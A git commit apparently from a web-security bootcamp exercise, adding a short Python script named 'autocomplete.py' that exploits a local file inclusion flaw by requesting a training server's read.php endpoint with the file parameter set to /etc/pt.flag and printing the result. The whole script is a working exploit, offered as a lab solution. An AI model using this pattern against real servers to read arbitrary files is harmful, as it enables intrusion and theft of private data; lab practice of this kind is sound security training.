511f6e677951b62e1028bb30d51187a459822df8
Denchikot123 <75613107+Denchikot123@users.noreply.github.com>
2026-07-04 00:34:47 +0300

    autocomplete.py

--- BootCamp/Web/Web-2-1/Script/autocomplete.py
+++ BootCamp/Web/Web-2-1/Script/autocomplete.py
@@ -1,1 +1,20 @@
+import requests
 
+BASE_URL = "http://www.edu.stf/api/read.php"
+PAYLOAD = "/etc/pt.flag"
+
+def solve_lfi():
+    params = {
+        "file": PAYLOAD
+    }
+    
+    try:
+        response = requests.get(BASE_URL, params=params, timeout=10)
+        
+        print(response.text)
+            
+    except requests.exceptions.RequestException as e:
+        print(f"Ошибка: {e}")
+
+if __name__ == "__main__":
+    solve_lfi()
